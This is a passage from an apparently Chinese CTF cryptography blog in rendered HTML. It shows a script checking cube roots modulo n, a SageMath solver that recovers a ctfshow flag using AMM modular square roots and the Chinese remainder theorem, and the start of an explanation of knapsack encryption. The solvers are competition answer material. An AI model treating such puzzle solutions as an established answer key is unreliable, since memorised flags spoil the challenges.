number">16399975821954318279221498470275521146084468474951947690849471303696067145089454840116636668718094830771604329504802271219147143674615173355400952708408746368044309638665492578797050592110356801725854406347821079081157487918992622400462465388082464774696448382685479944891218685238696458096657412926524712567669614565532058043579724279426556454939680807472739837985809673799969798738593585980694664789237839687687796230523379344762186979226349278188873930789783857039091180416888435596976167786057695368710150520870289607521049807301430045313742380064830918865207342030577149859823652984530212731974224763950142974621</span><span class="token punctuation">,</span> <span class="token number">118376620831769511477866973072371934475020796752620925673118534551164773446938312398569573679592158603383872824973732698728390995878086711747236172795750569226610200641434547443746623460729162322168208115247321277147882591962895515811370349077174567949437554802765321577395084044034054316894295810117788487548</span><span class="token punctuation">,</span> <span class="token number">2636318234956593740025392750115188144201643355150271367205885378997179090543819773476577550528375163758510881992249744774524837065489772391156037111732467139693340916788711638687169314077851149378307041485634962316435620167189448246015443556715342171784808908063399612060691731983276962947560584384335316122282037142086941835032738329850136894931990705161961038218917946748067094287897131597506323689531027690334541348560039800989704389300502732058283731159165628739251642679570408402108118104583164460322951459558839451931706278697205870900622234858961063581108199081076817814272087232781399673277754759478621882611</span><span class="token punctuation">,</span> <span class="token number">6499923879915138342858869356582590861130291995517603812052133716178234746533241737483268105124561484329319690969270714817941158351001302244375332727987416718695298178049259665052620644321602664094820510278569361228681031817116243817011512080214536206408407155105866448471154438346652800633930600912186263889013394664316661787502455744483605331139029724777749672860598784630335665820774628981390708884654060406739800168399577656663475628461891448512238948421204060693304430762642930211936422386082993349344387307942221577378260788732589892542175026796700340977171479382730295803171335098970494264976431029903834527839</span><span class="token punctuation">,</span> <span class="token number">9038736347580887208116294651480505977356892520242549511647711958794851966958323505447060125433998050906882218022887300278018435418965579910075201650274907495269211152612176575799922287905990204213405299522446763227582381644794647411659403174315339338373641745624661179320713968225376165502623845152726404589025779394696194970808455124099506923873095191936477520729599452091871779445992192681266604024563857734525193290538837872322511703407147432634320575991291892781790092162090370420611963311513027732755758650739228065261169314032678111718633554934739976611621640149523099062104079362706499829930561360922499291537</span><span class="token punctuation">,</span> <span class="token number">11675054582537480948141687401595694121558535875392820878853597337792031057502143278923637675962373214665393100015137045052543272484455352301231238762007374634962552069400888214487091601983841353591712341008081725544018001811984095657674846731030681510158450653688060791381405700208653128450184429537061720711189439915951367294363326480877271884330065100345817633275398864288774100286951011880203354034502726821475861814125144974583825096829563452945368134354706952294431534200226231378973457955367029870910501995050746240044993000766988466807885440716526472243292284427834595298981082551453845186314020310283332686600</span><span class="token punctuation">,</span> <span class="token number">7263733707082586196337236363577742140752533124284072511591452208520653308012393329156791013065158182683773756543281811626681148258124098719869582868688862509655670543827521275057260633710902988252726854583616755536040835934686930337435509751152586396503232319516213884359372514908766694515166227630003132556255806138296684909566663232020442294393639580780408201233174407870402265182983513003228058535460592987229581888590029188380615965585868385871115078413663598379924906333240549539185003834662375236874603638121907301063200147908738766059574769331994946357490108764004714664985146608744264476825743164449898076623</span><span class="token punctuation">,</span> <span class="token number">9802546174748335061594661658475657256979133649009018211187030451137270528437475097120583033374594749261336283596898397086758425326088376385569451790976353286229583518390438185804562277295290528371311643827494157534942185762365333932083400845253389528468466910035008615208932044787490059383859471870543273256268190868676218092872662611636343887127705047939136049102175075331938378808201076703103953675370390315014975010729289404039652040531124369993196705983751430468410567732687989747860544760092409620285974980918913788946108673208826985236033297470034581991940269530797517923917890872480270041779873495468562840321</span><span class="token punctuation">,</span> <span class="token number">12438864409704928801620054408590845401180777004159289578392915830134449618981294870597160583902969913019847165589148141861283262391578148776725488902708820425922924435179149824491731591373141677749618685313129119851377805929554782178098844401968731700253275818098408227269623776770767022331420056254878589378431851389931390416427533968414108847584674956348476161647974487528840699649159895902040703685309259401965643534315596506300965433953540390304244264347166489981052009770823850706222039403946411758440718325230431963729932359943137340325285183251821077623610913809109014160794894061227615398163332444829396235384</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n <span class="token operator">==</span> c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>    f <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token keyword">if</span> <span class="token string">b"DAS"</span> <span class="token keyword">in</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="84"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No flag."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">continue</span></pre></td></tr></table></figure><p>看看官方解释吧</p>
<h3 id="payload-2"><a class="anchor" href="#payload-2">#</a> payload</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>p<span class="token operator">=</span><span class="token number">145332367700944303747548912160113939198078051436029477960348968315913956664143693347226702600438608693933768134575289286283267810723137895903153829001826223446477799895493265422562348917012216790077395795861238257357035152687833639085415763850743538206986781418939737511715957738982536382066693822159860701263</span></pre></td></tr><tr><td data-num="2"></td><td><pre>q<span class="token operator">=</span><span class="token number">116660458253067608044065523310547233337730583902133756095473339390057738510707447906971188577217274861047379404014140178165569604404468897712846876108444468370709141219302291601408652742006268186059762087155933131837323952675627966299810891805398890428420575425160696531236660480933905879208166090591482794763</span></pre></td></tr><tr><td data-num="3"></td><td><pre>r<span class="token operator">=</span><span class="token number">157931722402853245421436270609912823260313730941283152856444641969403238646482562190531038393124087232554754746464603598717356255570166081501573727336977292059427220330169044611674973569766966838498453232642731737958791706086957762244686953294662693939604300864961637325536379321027705854708492453330690705531</span></pre></td></tr><tr><td data-num="4"></td><td><pre>s<span class="token operator">=</span><span class="token number">100973451687449518854742673778783266158999451072058606348222018797891147675959983616210003484476577612134482311993701677242007759556951494382833070563369964294544839433671087037596159753825249018950693369209927951667775267086896180395776150188902057785214767230658487267587289809918132337927575673868568976679</span></pre></td></tr><tr><td data-num="5"></td><td><pre>t<span class="token operator">=</span><span class="token number">93960345071948255233882121683650797512129333868351496468898834736770441398743300745703393838320587998953678254272245400344928586394089488734271897540051673996675973642347859306921527430850673334243441180183460927865980713929789963587608547554858491264614271309608925634272282292964002897650355047792764365447</span></pre></td></tr><tr><td data-num="6"></td><td><pre>c<span class="token operator">=</span><span class="token number">9144597920381774885442906257311149465702295057238600973973598305004391534618770363098565074541384771979931799878381439264848137810353858418200992191234142740194489573540381681161219332611454834544291634628456257670178843484698324641739324687497388018406214041657278323855749902661752448796122517061920880552011343608609622885787617238758769398972009949575526258430282648817039091284796330585349957724522615105102735930258969562103112238020133587096826386028128471852377225525357348919204333121695432662339443004327748973224423132988376298843862056631045488285859621661802413201793962883794915513510467912312842687601478117040419013468059983777273699192408773551806581458197324620065210523913467414181480875280203580147077789063808832356486197271376615883221558265591069223727607585313240243619515521180600435114131162272519949101464089935441251751426683447701142156416866113627126765919641034042927519834229168536331952275698122511502745177547569813354280565828372968703810158857859460406828090199683324760956105682902577189283246483314689365570862217407333103243336691401424548702387876409228977278498691200028282744239512091373110111792177228979867318546462714521296256938374618636206565791541769138267080789842400796973226733816939794717596194090232425688504890234304977612220790858557639246367437740975495450011676714198668471438814299689325208882261918460708833888406187912527346628912894921059735420931656953236560178909180587372589456926690219114173193202048332172538564489660440225377822914097420807957784201785024166011709377791129</span></pre></td></tr><tr><td data-num="7"></td><td><pre>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>c</pre></td></tr><tr><td data-num="9"></td><td><pre>aes1<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>c</pre></td></tr><tr><td data-num="12"></td><td><pre>aes2<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>c</pre></td></tr><tr><td data-num="15"></td><td><pre>aes3<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>c</pre></td></tr><tr><td data-num="18"></td><td><pre>aes4<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>f<span class="token operator">=</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>c</pre></td></tr><tr><td data-num="21"></td><td><pre>aes5<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">for</span> i1 <span class="token keyword">in</span> aes1<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> aes2<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">for</span> i3 <span class="token keyword">in</span> aes3<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">for</span> i4 <span class="token keyword">in</span> aes4<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> aes5<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                    m<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>crt<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>i2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>i3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>i5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                    m<span class="token operator">=</span>m<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token string">'big'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                    <span class="token keyword">if</span> <span class="token string">b'ctfshow'</span><span class="token keyword">in</span> m<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure><p>整个有限域开方用 AMM 算法 + CRT 解的</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/29/a2c71791f9ada903.png" alt="" /></p>
<h1 id="背包加密"><a class="anchor" href="#背包加密">#</a> 背包加密</h1>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>假定一个背包可以称重</mtext><mi>W</mi><mtext>，现在有</mtext><mi>n</mi><mtext>个物品，其重量分别为</mtext><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mspace linebreak="newline"></mspace><mtext>我们想问一下装哪些物品可以恰好使得背包装满，并且每个物品只能被装一次</mtext></mrow><annotation encoding="application/x-tex">假定一个背包可以称重 W，现在有 n 个物品，其重量分别为 a_1,a_2,...,a_n \\我们想问一下装哪些物品可以恰好使得背包装满，并且每个物品只能被装一次
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">假</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">背</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">重</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">物</span><span class="mord cjk_fallback">品</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">装</span><span class="mord cjk_fallback">哪</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">物</span><span class="mord cjk_fallback">品</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">恰</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">背</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">装</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">物</span><span class="mord cjk_fallback">品</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">装</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">次</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>x</mi><mn>2</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mo>+</mo><msub><mi>x</mi><mi>n</mi></msub><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mi>W</mi><mspace width="1em"/><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo><mo stretchy="false">)</mo><mspace width="1em"/><mtext>复杂度为</mtext><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_1a_1+x_2a_2+,...,+x_na_n=W \quad (x_i \in \lbrace 0 ,1 \rbrace) \quad 复杂度为O(2^n)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">杂</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>在加密时，如果我们想要加密的明文为 x，那么我们可以将其表示为 n 位二进制数，然后分别乘上 a_i 即可得到加密结果。</p>
<p>解密的时候当 a_i 是超递增的话就可解</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>超递增是指序列满足</mtext><mspace width="1em"/><msub><mi>a</mi><mi>i</mi></msub><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>a</mi><mi>k</mi></msub><mspace width="1em"/><mtext>即第</mtext><mi>i</mi><mtext>个数大于前面所有数的和</mtext><mspace width="1em"/><mtext>“后一个数比前一个数至少大一倍”</mtext></mrow><annotation encoding="application/x-tex">超递增是指序列满足 \quad a_i&gt;\sum_{k=1}^{i-1} {a_k} \quad 即第 i 个数大于前面所有数的和 \quad “后一个数比前一个数至少大一倍”
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">超</span><span class="mord cjk_fallback">递</span><span class="mord cjk_fallback">增</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.302113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.8478869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.302113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">第</span><span class="mord mathnormal">i</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">和</span><span class="mspace" style="margin-right:1em;"></span><span class="mord">“</span><span class="mord cjk_fallback">后</span><span 